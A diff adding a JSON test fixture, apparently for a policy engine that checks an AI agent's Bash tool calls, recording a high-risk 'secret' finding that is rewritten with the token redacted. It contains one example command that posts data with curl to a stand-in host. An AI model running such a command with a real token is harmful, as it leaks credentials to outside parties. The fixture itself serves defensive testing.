@@ -1,0 +1,22 @@
+{
+  "compare": {
+    "action": "rewrite",
+    "actor": "model",
+    "decision": "rewrite",
+    "dryRunKinds": null,
+    "exemptionId": null,
+    "overrideSource": null,
+    "rewritten": true,
+    "risk": "high",
+    "ruleId": "privacy:wp02_token",
+    "secretKinds": [
+      "wp02_token"
+    ],
+    "skipped": false,
+    "threat": "secret",
+    "tool": "Bash"
+  },
+  "normalization": null,
+  "redacted": "curl https://example.invalid/h -d <标签>\nBash",
+  "v2Intended": null
+}
